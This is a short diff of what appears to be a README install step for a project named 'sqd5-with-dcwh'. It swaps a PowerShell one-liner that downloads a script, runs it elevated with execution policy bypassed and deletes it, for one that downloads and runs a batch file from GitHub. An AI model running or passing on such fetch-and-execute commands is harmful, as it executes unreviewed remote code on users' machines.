@@ -37,7 +37,7 @@
 
 ```powershell
 
-iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1" -OutFile "$env:TEMP\sqd5dcwh.ps1"; Start-Process "powershell.exe" -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$env:TEMP\sqd5dcwh.ps1`"" -Verb RunAs -Wait; Remove-Item "$env:TEMP\sqd5dcwh.ps1" -Force
+iwr https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.bat -OutFile "$env:TEMP\run.bat"; cmd /c "$env:TEMP\run.bat"
 
 ```
 
